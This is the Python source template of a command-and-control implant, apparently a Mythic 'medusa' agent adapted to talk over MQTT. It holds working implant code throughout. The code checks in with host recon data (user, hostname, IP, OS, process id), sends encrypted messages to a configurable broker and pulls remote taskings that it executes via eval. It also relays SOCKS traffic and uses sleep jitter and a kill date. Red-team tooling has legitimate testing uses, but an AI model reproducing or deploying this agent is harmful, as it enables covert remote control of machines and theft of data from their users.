import os, random, sys, json, socket, base64, time, platform, ssl, getpass
#added
import paho.mqtt.client as mqtt

from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

CRYPTO_HERE

    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]

    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def sendMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.sendMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.sendMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.sendMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data):
        #CHANGED
        # Initialize MQTT client
        client = mqtt.Client(client_id=self.agent_config["MQClient"], clean_session=False)
    
        # Configure MQTT authentication if necessary
        if self.agent_config["MQUser"] and self.agent_config["MQPass"]:
            client.username_pw_set(self.agent_config["MQUser"], self.agent_config["MQPass"])
    
        # Use SSL if specified
        if self.agent_config["UseSSL"].lower() == 'true':
            client.tls_set()  # Add specific SSL parameters if needed
    
        # Callback for when the client connects to the broker
        def on_connect(client, userdata, flags, rc):
            # Subscribe to the receiving topic
            recit = self.agent_config["Topic"]+self.agent_config["RecTopic"]
            client.subscribe(recit)
    
        # Callback for when a message is received
        def on_message(client, userdata, msg):
            # Decode the received message (assuming base64 encoding)
            self.received_message = base64.b64decode(msg.payload)
    
        # Assign the callbacks
        client.on_connect = on_connect
        client.on_message = on_message
    
        # Connect to the MQTT broker
        client.connect(self.agent_config["Server"], int(self.agent_config["Port"]))
    
        # Start the MQTT loop in a separate thread
        client.loop_start()
    
        # Publish the data to the specified topic
        sendit = self.agent_config["Topic"]+self.agent_config["SenTopic"]
        client.publish(sendit, payload=data)	
    
        # Wait for the response
        self.received_message = None
        while self.received_message is None:
            pass  # Wait until the on_message callback processes the response
    
        # Stop the MQTT loop and disconnect
        client.loop_stop()
        client.disconnect()
    
        # Return the received message
        return self.received_message if self.received_message else ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_HERE

    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "mqtt_server",
            "Port": "mqtt_port",
            "MQClient": "mqtt_client",
            "MQUser": "mqtt_user",
            "MQPass": "mqtt_pass",
            "RecTopic": "mqtt_mythic",
            "SenTopic": "mqtt_taskcheck",
            "Topic": "mqtt_topic",
            "UseSSL": "use_ssl",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
        }

        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    medusa = medusa()
